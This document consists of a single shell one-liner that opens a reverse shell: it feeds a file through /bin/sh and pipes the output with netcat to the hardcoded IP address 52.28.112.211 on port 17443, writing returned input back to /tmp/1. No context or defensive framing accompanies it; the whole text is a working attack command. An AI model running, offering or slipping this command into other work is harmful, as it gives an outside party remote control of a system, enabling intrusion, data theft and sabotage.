tail -n 0 -f /tmp/1 | /bin/sh 2>&1 | nc -nv 52.28.112.211 17443  1> /tmp/1
